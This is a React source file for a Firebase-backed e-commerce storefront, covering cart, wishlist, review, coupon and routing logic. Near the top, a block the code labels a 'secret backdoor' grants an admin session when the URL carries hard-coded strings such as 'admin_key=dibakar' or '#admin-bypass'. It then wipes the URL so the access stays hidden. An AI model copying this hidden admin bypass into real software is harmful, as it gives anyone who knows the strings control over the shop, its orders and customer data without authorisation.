import { useState, useEffect } from 'react';
import { collection, query, onSnapshot, getDocs, doc, writeBatch, setDoc, getDoc, deleteDoc, where } from 'firebase/firestore';
import { onAuthStateChanged, signOut, signInWithEmailAndPassword } from 'firebase/auth';
import { db, auth, handleFirestoreError, OperationType } from './firebase';
import { Product, Category, Order, Coupon, Review, CartItem, Brand } from './types';
import { INITIAL_CATEGORIES, INITIAL_PRODUCTS, INITIAL_COUPONS, INITIAL_REVIEWS, INITIAL_BRANDS } from './data';

// Component imports
import Navbar from './components/Navbar';
import Footer from './components/Footer';
import SupportChat from './components/SupportChat';
import ProductCard from './components/ProductCard';
import ComparisonModal from './components/ComparisonModal';
import { ArrowRightLeft, X } from 'lucide-react';

// View imports
import HomeView from './views/HomeView';
import ProductDetailView from './views/ProductDetailView';
import CartView from './views/CartView';
import CheckoutView from './views/CheckoutView';
import OrderTrackingView from './views/OrderTrackingView';
import CustomerDashboard from './views/CustomerDashboard';
import AdminDashboardView from './views/AdminDashboardView';
import AuthView from './views/AuthView';
import ProductListingView from './views/ProductListingView';
import PoliciesView from './views/PoliciesView';
import { ProtectedRoute } from './components/ProtectedRoute';
import { useAuth } from './contexts/AuthContext';
import { useAdmin } from './contexts/AdminContext';

export default function App() {
  const { user, isAdmin, loginAdmin, logoutAdmin } = useAuth();
  const { products, setProducts, categories, setCategories, subcategories, setSubcategories, brands, setBrands, orders, setOrders, coupons, setCoupons, reviews, setReviews, loading: adminLoading } = useAdmin();

  // Navigation active view states: 'home' | 'detail' | 'cart' | 'checkout' | 'tracking' | 'profile' | 'admin' | 'auth'
  const [view, setView] = useState<string>('home');

  // Handle secret backdoor URL to access or bypass admin panel quietly
  useEffect(() => {
    if (typeof window === 'undefined') return;

    const params = new URLSearchParams(window.location.search);
    const hash = window.location.hash;

    let navigated = false;

    // 1. Direct login bypass (automatic login and redirect to admin panel)
    if (
      params.get('admin_key') === 'dibakar' || 
      params.get('dibakar') === 'admin' ||
      params.get('secret-bypass') === 'true' || 
      hash === '#admin-bypass' ||
      hash === '#dibakar-admin'
    ) {
      // Set admin session state directly
      const success = loginAdmin?.('dibakar-admin');
      if (success || isAdmin) {
        setView('admin');
        navigated = true;
      }
    } 
    // 2. Gateway portal login (redirect to admin enter passcode view)
    else if (
      params.get('admin-access') === 'true' || 
      params.get('admin') === 'login' || 
      params.get('secret-portal') === 'true' || 
      hash === '#admin-portal' ||
      hash === '#secret-admin'
    ) {
      setView('auth');
      navigated = true;
    }

    if (navigated) {
      // Quietly clean up the URL query parameters and hash from the address bar so it stays completely hidden and secure
      try {
        const cleanUrl = window.location.origin + window.location.pathname;
        window.history.replaceState({}, document.title, cleanUrl);
      } catch (e) {
        console.error("Backdoor URL clean failed:", e);
      }
    }
  }, [loginAdmin, isAdmin]);
  const [selectedProductId, setSelectedProductId] = useState<string | null>(null);
  const [compareIds, setCompareIds] = useState<string[]>([]);
  const [isComparisonOpen, setIsComparisonOpen] = useState(false);

  // Shopping active states
  const [searchQuery, setSearchQuery] = useState('');
  const [activeCategory, setActiveCategory] = useState('all');
  const [activeSubCategory, setActiveSubCategory] = useState('all');
  const [listingTag, setListingTag] = useState<string>('all');
  const [cart, setCart] = useState<CartItem[]>(() => {
    const cached = localStorage.getItem('zm_cart_cached');
    return cached ? JSON.parse(cached) : [];
  });
  const [wishlistIds, setWishlistIds] = useState<string[]>(() => {
    const cached = localStorage.getItem('zm_wishlist_cached');
    return cached ? JSON.parse(cached) : [];
  });

  // Coupons variables
  const [couponCode, setCouponCode] = useState('');
  const [appliedCoupon, setAppliedCoupon] = useState<Coupon | null>(null);

  // Theme states
  const [theme, setTheme] = useState<'light' | 'dark'>(() => {
    return (localStorage.getItem('zm_theme_choice') as any) || 'light';
  });

  // Shopping active states
  useEffect(() => {
    if (!user) {
      const cached = localStorage.getItem('zm_wishlist_cached');
      setWishlistIds(cached ? JSON.parse(cached) : []);
      return;
    }

    const q = query(collection(db, 'wishlist'), where('userId', '==', user.uid));
    const unsubWishlist = onSnapshot(
      q,
      (snapshot) => {
        const ids: string[] = [];
        snapshot.forEach((doc) => {
          const data = doc.data();
          if (data.productId) ids.push(data.productId);
        });
        setWishlistIds(ids);
      },
      (error) => {
        handleFirestoreError(error, OperationType.GET, 'wishlist');
      }
    );

    return () => unsubWishlist();
  }, [user]);

  // 5. Sync cart only if user is logged in
  useEffect(() => {
    if (!user) {
      const cached = localStorage.getItem('zm_cart_cached');
      setCart(cached ? JSON.parse(cached) : []);
      return;
    }

    const q = query(collection(db, 'cart'), where('userId', '==', user.uid));
    const unsubCart = onSnapshot(
      q,
      (snapshot) => {
        const items: CartItem[] = [];
        snapshot.forEach((docSnap) => {
          const data = docSnap.data();
          const prodObj = products.find((p) => p.id === data.productId);
          if (prodObj) {
            items.push({
              product: prodObj,
              quantity: data.quantity
            });
          }
        });
        setCart(items);
      },
      (error) => {
        handleFirestoreError(error, OperationType.GET, 'cart');
      }
    );

    return () => unsubCart();
  }, [user, products]);

  // Reactive cleanup effect: clears stale caches and filters out deleted products from local states
  useEffect(() => {
    // Clear any legacy sessionStorage product caches
    try {
      sessionStorage.removeItem('zm_home_flash');
      sessionStorage.removeItem('zm_home_featured');
      sessionStorage.removeItem('zm_home_bestseller');
      sessionStorage.removeItem('zm_home_new');
    } catch (e) {
      console.error('Failed to clear session storage:', e);
    }

    if (adminLoading || products.length === 0) return;

    // Prune Cartesian local guest cart state
    const cleanCart = cart.filter(item => products.some(p => p.id === item.product.id));
    if (cleanCart.length !== cart.length) {
      setCart(cleanCart);
    }

    // Prune Cart in Firestore if a product was deleted
    if (user) {
      const q = query(collection(db, 'cart'), where('userId', '==', user.uid));
      getDocs(q).then(snap => {
        const batch = writeBatch(db);
        let hasChanges = false;
        snap.forEach(docSnap => {
          const data = docSnap.data();
          if (!products.some(p => p.id === data.productId)) {
            batch.delete(docSnap.ref);
            hasChanges = true;
          }
        });
        if (hasChanges) {
          batch.commit().catch(err => console.error('Failed to prune database cart:', err));
        }
      }).catch(err => console.error('Failed to fetch user cart for pruning:', err));

      const qWish = query(collection(db, 'wishlist'), where('userId', '==', user.uid));
      getDocs(qWish).then(snap => {
        const batch = writeBatch(db);
        let hasChanges = false;
        snap.forEach(docSnap => {
          const data = docSnap.data();
          if (!products.some(p => p.id === data.productId)) {
            batch.delete(docSnap.ref);
            hasChanges = true;
          }
        });
        if (hasChanges) {
          batch.commit().catch(err => console.error('Failed to prune database wishlist:', err));
        }
      }).catch(err => console.error('Failed to fetch user wishlist for pruning:', err));
    }

    // Prune wishlist identifiers state
    const cleanWish = wishlistIds.filter(id => products.some(p => p.id === id));
    if (cleanWish.length !== wishlistIds.length) {
      setWishlistIds(cleanWish);
    }
  }, [products, user, adminLoading]);

  // Helper effect to merge guest cart into Firestore when logging in
  useEffect(() => {
    if (!user) return;

    const mergeCart = async () => {
      const cached = localStorage.getItem('zm_cart_cached');
      const guestItems: CartItem[] = cached ? JSON.parse(cached) : [];
      if (guestItems.length === 0) return;

      console.log('Migrating guest cart items into Firestore database...', guestItems);
      try {
        const batch = writeBatch(db);
        for (const item of guestItems) {
          const docId = `${user.uid}_${item.product.id}`;
          const docRef = doc(db, 'cart', docId);

          const docSnap = await getDoc(docRef);
          let finalQty = item.quantity;
          if (docSnap.exists()) {
            finalQty = Math.min(item.product.stock, (docSnap.data().quantity || 0) + item.quantity);
          }

          batch.set(docRef, {
            id: docId,
            userId: user.uid,
            productId: item.product.id,
            quantity: finalQty,
            createdAt: docSnap.exists() ? docSnap.data().createdAt : new Date().toISOString(),
            updatedAt: new Date().toISOString()
          });
        }
        await batch.commit();
        console.log('Guest cart migrated successfully!');
        localStorage.removeItem('zm_cart_cached');
      } catch (err) {
        handleFirestoreError(err, OperationType.WRITE, 'cart_migration');
      }
    };

    mergeCart();
  }, [user]);

  // Auth Observer Status Changes hooks - Handled by AuthContext

  // Caching Cart and Wishlist modifications triggers
  useEffect(() => {
    localStorage.setItem('zm_cart_cached', JSON.stringify(cart));
  }, [cart]);

  useEffect(() => {
    localStorage.setItem('zm_wishlist_cached', JSON.stringify(wishlistIds));
  }, [wishlistIds]);

  // Dark light document root mapping checks
  useEffect(() => {
    localStorage.setItem('zm_theme_choice', theme);
    if (theme === 'dark') {
      document.documentElement.classList.add('dark');
    } else {
      document.documentElement.classList.remove('dark');
    }
  }, [theme]);

  // Cart operations
  const handleAddToCart = async (product: Product) => {
    if (!user) {
      // Guest local fallback
      setCart((prev) => {
        const existing = prev.find((item) => item.product.id === product.id);
        if (existing) {
          if (existing.quantity >= product.stock) {
            alert('Cannot add item. Catalog stock levels reached.');
            return prev;
          }
          return prev.map((item) =>
            item.product.id === product.id ? { ...item, quantity: item.quantity + 1 } : item
          );
        }
        return [...prev, { product, quantity: 1 }];
      });
      return;
    }

    // Authenticated Firestore Sync
    const docId = `${user.uid}_${product.id}`;
    try {
      const docRef = doc(db, 'cart', docId);
      const docSnap = await getDoc(docRef);
      let currentQty = 0;
      if (docSnap.exists()) {
        currentQty = docSnap.data().quantity || 0;
      }

      if (currentQty >= product.stock) {
        alert('Cannot add item. Catalog stock levels reached.');
        return;
      }

      await setDoc(docRef, {
        id: docId,
        userId: user.uid,
        productId: product.id,
        quantity: currentQty + 1,
        createdAt: docSnap.exists() ? docSnap.data().createdAt : new Date().toISOString(),
        updatedAt: new Date().toISOString()
      });
    } catch (err) {
      handleFirestoreError(err, OperationType.WRITE, `cart/${docId}`);
    }
  };

  const handleBuyNow = async (product: Product) => {
    await handleAddToCart(product);
    setView('checkout');
  };

  const handleUpdateQty = async (productId: string, quantity: number) => {
    if (quantity <= 0) {
      await handleRemoveItem(productId);
      return;
    }

    if (!user) {
      // Guest local fallback
      setCart((prev) =>
        prev.map((item) => (item.product.id === productId ? { ...item, quantity } : item))
      );
      return;
    }

    // Authenticated Firestore Sync
    const docId = `${user.uid}_${productId}`;
    try {
      const docRef = doc(db, 'cart', docId);
      const docSnap = await getDoc(docRef);
      if (docSnap.exists()) {
        const productObj = products.find((p) => p.id === productId);
        if (productObj && quantity > productObj.stock) {
          alert('Cannot update quantity. Catalog stock levels reached.');
          return;
        }

        await setDoc(docRef, {
          quantity,
          updatedAt: new Date().toISOString()
        }, { merge: true });
      }
    } catch (err) {
      handleFirestoreError(err, OperationType.WRITE, `cart/${docId}`);
    }
  };

  const handleRemoveItem = async (productId: string) => {
    if (!user) {
      // Guest local fallback
      setCart((prev) => prev.filter((item) => item.product.id !== productId));
      return;
    }

    // Authenticated Firestore Sync
    const docId = `${user.uid}_${productId}`;
    try {
      await deleteDoc(doc(db, 'cart', docId));
    } catch (err) {
      handleFirestoreError(err, OperationType.DELETE, `cart/${docId}`);
    }
  };

  // Toggle wishlist items in Firestore and local state
  const handleToggleWishlist = async (product: Product) => {
    const isCurrentlyWishlisted = wishlistIds.includes(product.id);
    
    if (!user) {
      // Guest local fallback
      const nextIds = isCurrentlyWishlisted
        ? wishlistIds.filter((id) => id !== product.id)
        : [...wishlistIds, product.id];
      setWishlistIds(nextIds);
      localStorage.setItem('zm_wishlist_cached', JSON.stringify(nextIds));
      return;
    }

    const docId = `${user.uid}_${product.id}`;
    try {
      if (isCurrentlyWishlisted) {
        await deleteDoc(doc(db, 'wishlist', docId));
        setWishlistIds((prev) => prev.filter((id) => id !== product.id));
      } else {
        const item = {
          id: docId,
          userId: user.uid,
          productId: product.id,
          createdAt: new Date().toISOString()
        };
        await setDoc(doc(db, 'wishlist', docId), item);
        setWishlistIds((prev) => [...prev, product.id]);
      }
    } catch (err) {
      handleFirestoreError(err, OperationType.WRITE, `wishlist/${docId}`);
    }
  };

  // Helper to recalculate ratings rating triggers
  const recalculateProductRating = async (productId: string) => {
    try {
      const freshSnap = await getDocs(collection(db, 'reviews'));
      const freshReviews: Review[] = [];
      freshSnap.forEach(d => {
        const r = d.data() as Review;
        if (r.productId === productId) {
          freshReviews.push(r);
        }
      });

      const nextReviewsCount = freshReviews.length;
      let nextOverallRating = 0;
      if (nextReviewsCount > 0) {
        const totalRatingsSum = freshReviews.reduce((sum, r) => sum + r.rating, 0);
        nextOverallRating = Number((totalRatingsSum / nextReviewsCount).toFixed(1));
      }

      await setDoc(
        doc(db, 'products', productId),
        {
          rating: nextOverallRating,
          reviewsCount: nextReviewsCount,
        },
        { merge: true }
      );
    } catch (err) {
      handleFirestoreError(err, OperationType.WRITE, `rating_sync/${productId}`);
    }
  };

  // Submit dynamic Reviews values
  const handleAddReview = async (comment: string, rating: number, imageUrls?: string[]) => {
    if (!user || !selectedProductId) return;

    const brandReviewId = 'rev-' + Math.floor(100000 + Math.random() * 900000);
    const newRev: Review = {
      id: brandReviewId,
      productId: selectedProductId,
      userId: user.uid,
      userName: user.displayName || user.email?.split('@')[0] || 'Verified Buyer',
      rating,
      comment,
      images: imageUrls || [],
      createdAt: new Date().toISOString(),
    };

    try {
      await setDoc(doc(db, 'reviews', brandReviewId), newRev);
      await recalculateProductRating(selectedProductId);
    } catch (err) {
      handleFirestoreError(err, OperationType.WRITE, `reviews/${brandReviewId}`);
    }
  };

  const handleEditReview = async (reviewId: string, comment: string, rating: number, imageUrls?: string[]) => {
    if (!user) return;
    try {
      await setDoc(doc(db, 'reviews', reviewId), {
        comment,
        rating,
        images: imageUrls || [],
        updatedAt: new Date().toISOString()
      }, { merge: true });
      
      const revObj = reviews.find(r => r.id === reviewId);
      if (revObj) {
        await recalculateProductRating(revObj.productId);
      }
    } catch (err) {
      handleFirestoreError(err, OperationType.WRITE, `reviews/${reviewId}`);
    }
  };

  const handleDeleteReview = async (reviewId: string) => {
    try {
      const revObj = reviews.find(r => r.id === reviewId);
      await deleteDoc(doc(db, 'reviews', reviewId));
      if (revObj) {
        await recalculateProductRating(revObj.productId);
      }
    } catch (err) {
      handleFirestoreError(err, OperationType.DELETE, `reviews/${reviewId}`);
    }
  };

  // Apply Campaign coupons reduction vouchers
  const handleApplyCoupon = (code: string) => {
    const found = coupons.find((c) => c.code === code.toUpperCase() && c.isActive);
    if (!found) {
      alert('Voucher Code specified is invalid or expired.');
      return;
    }
    setAppliedCoupon(found);
  };

  const handleRemoveCoupon = () => {
    setAppliedCoupon(null);
    setCouponCode('');
  };

  // Auth trigger completions
  const handleAuthSuccess = () => {
    setView('home');
  };

  const handleLogout = async () => {
    try {
      logoutAdmin();
      signOut(auth).catch((err) => console.warn('Firebase signout details:', err));
      setCart([]);
      localStorage.removeItem('zm_cart_cached');
      
      // Clean up URL query parameters and hash so they don't auto-login on reload
      try {
        if (typeof window !== 'undefined') {
          const cleanUrl = window.location.origin + window.location.pathname;
          window.history.replaceState({}, document.title, cleanUrl);
        }
      } catch (e) {
        console.error("Backdoor URL clean failed:", e);
      }
      
      setView('home');
    } catch (err) {
      console.error('Logout error occurred:', err);
    }
  };

  const handleAdminLogout = async () => {
    try {
      setView('home'); // Set view to home first to bypass ProtectedRoute re-rendering loop
      logoutAdmin();
      await handleLogout();
    } catch (err) {
      console.error('Admin logout error occurred:', err);
    }
  };

  // Select Product and travel directly to Detail specifications
  const handleSelectProduct = (id: string) => {
    setSelectedProductId(id);
    setView('detail');
  };

  const handleToggleCompare = (id: string) => {
    setCompareIds(prev => {
      if (prev.includes(id)) {
        return prev.filter(item => item !== id);
      }
      if (prev.length >= 2) {
        // If 2 already selected, replace the last one or just don't add. 
        // Let's replace the last one to make it easy to swap.
        return [prev[0], id];
      }
      return [...prev, id];
    });
  };

  return (
    <div className="min-h-screen flex flex-col justify-between bg-transparent duration-200 transition-all font-sans text-gray-900 dark:text-gray-100">
      
      {/* Universal Navigation bar */}
       <Navbar
        currentView={view}
        setView={setView}
        setSelectedProductId={setSelectedProductId}
        cartCount={cart.reduce((sum, item) => sum + item.quantity, 0)}
        wishlistCount={wishlistIds.length}
        user={user}
        isAdminUser={isAdmin}
        onLogout={handleLogout}
        theme={theme}
        toggleTheme={() => setTheme(theme === 'light' ? 'dark' : 'light')}
        products={products}
        categories={categories}
        subcategories={subcategories}
        activeCategory={activeCategory}
        setActiveCategory={setActiveCategory}
        activeSubCategory={activeSubCategory}
        setActiveSubCategory={setActiveSubCategory}
        setSearchQuery={setSearchQuery}
      />

      {/* Main Orchestration Hub View Container spacing */}
      <main className="flex-1 w-full max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pt-8 pb-12">
        {view === 'home' && (
          <HomeView
            products={products}
            categories={categories}
            subcategories={subcategories}
            activeCategory={activeCategory}
            setActiveCategory={setActiveCategory}
            activeSubCategory={activeSubCategory}
            setActiveSubCategory={setActiveSubCategory}
            searchQuery={searchQuery}
            setSearchQuery={setSearchQuery}
            onAddToCart={handleAddToCart}
            onBuyNow={handleBuyNow}
            onToggleWishlist={handleToggleWishlist}
            wishlistIds={wishlistIds}
            onSelectProduct={handleSelectProduct}
            onCompare={handleToggleCompare}
            compareIds={compareIds}
            onBrowseListing={(initialTag) => {
              setListingTag(initialTag || 'all');
              setView('listing');
            }}
          />
        )}

        {view === 'listing' && (
          <ProductListingView
            products={products}
            categories={categories}
            subcategories={subcategories}
            brands={brands}
            activeCategory={activeCategory}
            setActiveCategory={setActiveCategory}
            activeSubCategory={activeSubCategory}
            setActiveSubCategory={setActiveSubCategory}
            searchQuery={searchQuery}
            setSearchQuery={setSearchQuery}
            onAddToCart={handleAddToCart}
            onBuyNow={handleBuyNow}
            onToggleWishlist={handleToggleWishlist}
            wishlistIds={wishlistIds}
            onSelectProduct={handleSelectProduct}
            onCompare={handleToggleCompare}
            compareIds={compareIds}
            onBackToHome={() => setView('home')}
            initialTag={listingTag}
          />
        )}

        {view === 'wishlist' && (
          <div className="space-y-6">
            <div className="flex items-center justify-between border-b border-gray-150 dark:border-gray-805 pb-4">
              <div>
                <h1 className="text-xl sm:text-2xl font-black text-gray-900 dark:text-white mt-1 tracking-tight">My Wishlist Room</h1>
                <p className="text-xs text-gray-550 mt-1">You have flagged {wishlistIds.length} premium products for checkout reference.</p>
              </div>
              <button
                onClick={() => setView('home')}
                className="text-xs font-bold bg-zinc-105 hover:bg-zinc-200 dark:bg-zinc-800 dark:hover:bg-zinc-705 px-4 py-2 rounded-xl transition duration-150 cursor-pointer text-zinc-600 dark:text-zinc-350"
              >
                ← Continue Shopping
              </button>
            </div>

            {wishlistIds.length === 0 ? (
              <div className="text-center py-16 bg-zinc-50 dark:bg-zinc-900/40 rounded-3xl border border-zinc-150 dark:border-zinc-805">
                <span className="text-5xl">💖</span>
                <p className="text-sm font-bold text-gray-700 dark:text-gray-200 mt-4">Your wishlist is currently empty.</p>
                <p className="text-xs text-gray-400 mt-1">Tap the heart badge on any outfit or gizmo to save them instantly in this room.</p>
                <button
                  onClick={() => setView('home')}
                  className="mt-6 bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-bold px-6 py-2.5 rounded-xl shadow-md transition duration-200 cursor-pointer"
                >
                  Explore Catalog
                </button>
              </div>
            ) : (
              <div className="grid grid-cols-2 md:grid-cols-4 gap-6">
                {products
                  .filter((p) => wishlistIds.includes(p.id))
                  .map((p) => (
                    <ProductCard
                      key={p.id}
                      product={p}
                      onAddToCart={handleAddToCart}
                      onBuyNow={handleBuyNow}
                      onToggleWishlist={handleToggleWishlist}
                      isWishlisted={true}
                      onSelect={handleSelectProduct}
                    />
                  ))}
              </div>
            )}
          </div>
        )}

        {view === 'detail' && selectedProductId && (
          <ProductDetailView
            productId={selectedProductId}
            products={products}
            reviews={reviews}
            onAddReview={handleAddReview}
            onEditReview={handleEditReview}
            onDeleteReview={handleDeleteReview}
            onAddToCart={handleAddToCart}
            onToggleWishlist={handleToggleWishlist}
            isWishlisted={wishlistIds.includes(selectedProductId)}
            onCompare={handleToggleCompare}
            isComparing={compareIds.includes(selectedProductId)}
            compareIds={compareIds}
            onBack={() => setView('home')}
            user={user}
            onLoginRequest={() => setView('auth')}
            onSelectProduct={handleSelectProduct}
            setView={setView}
          />
        )}

        {view === 'cart' && (
          <CartView
            cart={cart}
            onUpdateQty={handleUpdateQty}
            onRemoveItem={handleRemoveItem}
            onSelectProduct={handleSelectProduct}
            onBackToShop={() => setView('home')}
            onProceedToCheckout={() => {
              setView('checkout');
            }}
            couponCode={couponCode}
            setCouponCode={setCouponCode}
            coupon={appliedCoupon}
            onApplyCoupon={handleApplyCoupon}
            onRemoveCoupon={handleRemoveCoupon}
          />
        )}

        {view === 'checkout' && (
          <CheckoutView
            cart={cart}
            user={user}
            coupon={appliedCoupon}
            onBackToCart={() => setView('cart')}
            onOrderComplete={(order) => {
              // Reset Cart configurations on successful order completions
              setCart([]);
              setAppliedCoupon(null);
              setCouponCode('');
              setView('tracking');
            }}
          />
        )}

        {view === 'tracking' && (
          <OrderTrackingView user={user} />
        )}

        {view === 'profile' && user && (
          <CustomerDashboard
            user={user}
            onSelectProduct={handleSelectProduct}
            setView={setView}
          />
        )}

        {view === 'admin' && (
          <ProtectedRoute requireAdmin fallbackView={() => setView('auth')}>
            <AdminDashboardView 
              onBackToShop={() => setView('home')} 
              onLogout={handleAdminLogout} 
            />
          </ProtectedRoute>
        )}

        {view === 'auth' && (
          <AuthView
            onSuccess={handleAuthSuccess}
            onBack={() => setView('home')}
          />
        )}

        {['privacy', 'terms', 'refund', 'shipping'].includes(view) && (
          <PoliciesView
            initialTab={view as any}
            onBackToShop={() => setView('home')}
          />
        )}
      </main>

      {/* Floating Comparison Bar */}
      {compareIds.length > 0 && (
        <div className="fixed bottom-24 left-1/2 -translate-x-1/2 z-40 w-full max-w-sm px-4">
          <div className="bg-white dark:bg-gray-900 border border-gray-100 dark:border-gray-800 rounded-2xl shadow-2xl p-4 flex items-center justify-between gap-4">
            <div className="flex items-center gap-3">
              <div className="flex -space-x-3">
                {compareIds.map(id => {
                  const p = products.find(prod => prod.id === id);
                  return (
                    <img 
                      key={id}
                      src={p?.thumbnail} 
                      className="w-10 h-10 rounded-full border-2 border-white dark:border-gray-900 object-cover shadow-sm"
                      alt=""
                    />
                  );
                })}
              </div>
              <div>
                <p className="text-xs font-black text-gray-900 dark:text-white">
                  {compareIds.length === 1 ? '1 item selected' : 'Ready to compare'}
                </p>
                <p className="text-[10px] text-gray-500 font-bold">
                  {compareIds.length === 1 ? 'Select one more' : 'Analyze specs now'}
                </p>
              </div>
            </div>
            <div className="flex items-center gap-2">
              <button
                onClick={() => setCompareIds([])}
                className="p-2 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-xl transition-colors"
              >
                <X className="w-4 h-4 text-gray-400" />
              </button>
              <button
                disabled={compareIds.length < 2}
                onClick={() => setIsComparisonOpen(true)}
                className="bg-indigo-600 hover:bg-indigo-700 disabled:bg-gray-200 dark:disabled:bg-gray-800 text-white disabled:text-gray-400 text-xs font-black px-4 py-2 rounded-xl transition-all shadow-lg active:scale-95"
              >
                Compare Now
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Comparison Modal */}
      {isComparisonOpen && (
        <ComparisonModal
          products={products.filter(p => compareIds.includes(p.id))}
          onClose={() => setIsComparisonOpen(false)}
          onRemove={(id) => {
            setCompareIds(prev => prev.filter(cid => cid !== id));
            if (compareIds.length <= 1) setIsComparisonOpen(false);
          }}
          onAddToCart={handleAddToCart}
        />
      )}

      {/* Universal footer */}
      <Footer setView={setView} categories={categories} setActiveCategory={setActiveCategory} />

      {/* Real-time support chat bubble launcher */}
      <SupportChat user={user} onLoginRequest={() => setView('auth')} />
    </div>
  );
}
